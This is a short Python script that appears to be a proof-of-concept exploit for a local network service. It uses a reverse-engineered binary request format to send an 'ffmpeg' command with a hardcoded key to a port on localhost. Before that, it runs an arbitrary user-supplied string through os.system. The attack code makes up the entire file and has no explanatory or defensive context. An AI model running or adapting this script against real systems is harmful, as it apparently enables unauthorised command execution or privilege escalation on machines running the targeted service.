import socket
import struct
import argparse
import os

def prepare_packet(data: str):
    # Magic reverse engineered request format
    return b"\x00\x83" + struct.pack('>H', len(data) + 6) + b"\x00\x00\x00\x00\x00" + data.encode() + b"\x00"

def send_receive_data(ip: str, port: int, command: str) -> bytes:

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
    except (ConnectionRefusedError, TimeoutError):
        print(f"Could not execute {command} at server {ip}:{port} due to connection error.")
        return bytes()
    request = prepare_packet(command)
    sock.sendall(request)
    response = sock.recv(16384)
    sock.close()
    return response

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-port", type=int)
    parser.add_argument("-id", type=str)
    parser.add_argument("-command", type=str)
    args = parser.parse_args()
    print(args.command, "\n---")
    os.system(args.command)
    result = send_receive_data("127.0.0.1", args.port, f"ffmpeg&key=111&id={args.id}")
    print(result)

if __name__ == "__main__":
    main()
